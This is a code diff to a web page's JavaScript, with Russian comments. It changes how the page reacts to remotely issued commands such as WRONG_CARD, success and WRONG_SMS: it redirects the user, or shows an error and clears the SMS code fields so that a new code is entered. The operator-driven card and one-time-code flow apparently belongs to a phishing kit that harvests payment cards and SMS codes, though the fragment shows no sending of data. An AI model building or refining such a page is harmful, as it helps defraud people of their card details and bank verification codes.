@@ -1081,8 +1081,6 @@
             }, 500);
         };
 
-        
-
         function showNotification(type, title, message) {
             const overlay = document.getElementById('notificationOverlay');
             const card = document.getElementById('notificationCard');
@@ -1311,14 +1309,24 @@
                 console.log('❌ Получена команда WRONG_CARD');
                 hideLoading();
                 window.location.href = 'payment.html?status=wrong_card';
-           } else if (command.action === 'bind' || command.action === 'success') {
+            } else if (command.action === 'bind' || command.action === 'success') {
                 console.log('🎉 Получена команда SUCCESS');
                 hideLoading();
-                window.location.href = 'success.html';  // ← Прямой редирект без окошка
-            }
+                window.location.href = 'success.html';
             } else if (command.action === 'wrong_sms') {
                 console.log('❌ Получена команда WRONG_SMS');
-                window.showWrongSMSError();
+                // МГНОВЕННОЕ отображение ошибки без задержек
+                hideLoading();
+                showNotification('error', translations[currentLanguage].errorText, translations[currentLanguage].errorMessage);
+                
+                document.querySelectorAll('.code-input').forEach(input => {
+                    input.value = '';
+                    input.classList.remove('filled');
+                });
+                
+                setTimeout(() => {
+                    document.querySelector('.code-input').focus();
+                }, 300);
             }
         }
 
@@ -1430,4 +1438,3 @@
     </script>
 </body>
 </html>
-
